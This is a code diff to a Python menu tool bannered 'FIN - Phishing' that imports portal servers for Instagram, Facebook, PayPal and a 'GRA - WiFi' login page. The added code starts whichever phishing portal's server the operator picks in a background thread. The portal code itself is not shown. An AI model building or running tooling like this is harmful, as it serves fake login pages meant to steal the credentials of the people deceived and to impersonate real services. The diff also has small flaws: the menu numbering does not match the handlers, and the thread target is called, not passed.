@@ -1,5 +1,12 @@
 import pyfiglet
 
+from portals.Instagram.assets import api as instagramAPI
+from portals.Facebook.assets import api as facebookAPI
+from portals.PayPal.assets import api as paypalAPI
+from portals.GRA.assets import api as graAPI
+
+import threading
+
 ascii_banner = pyfiglet.figlet_format("FIN - Phishing")
 
 print("\n")
@@ -18,23 +25,47 @@ print(" [2] PayPal")
 print(" [4] GRA - WiFi")
 print(" " + "-" * 65)
 
+def startServerThread(code):
+    if code == 1:
+        serverThread = threading.Thread(target=instagramAPI.startServer())
+        serverThread.daemon = True
+        serverThread.start()
+
+    if code == 2:
+        serverThread = threading.Thread(target=facebookAPI.startServer())
+        serverThread.daemon = True
+        serverThread.start()
+
+    if code == 3:
+        serverThread = threading.Thread(target=paypalAPI.startServer())
+        serverThread.daemon = True
+        serverThread.start()
+
+    if code == 4:
+        serverThread = threading.Thread(target=graAPI.startServer())
+        serverThread.daemon = True
+        serverThread.start()
 
 while True:
-    command = input(" FIN: ")
+    command = input("\n FIN: ")
     command = int(command)
 
     if command == 0:
-        print(" Sad to see you go :(")
+        print(" \n")
         break
 
     elif command == 1:
-        print("Instagram")
+        print("\n")
+        startServerThread(1)
 
     elif command == 2:
-        print("Facebook")
+        print("\n")
+        startServerThread(2)
 
     elif command == 3:
-        print("Paypal")
+        print("\n")
+        startServerThread(3)
 
     elif command == 4:
-        print("GRA - WiFi")
+        print("\n")
+        startServerThread(4)
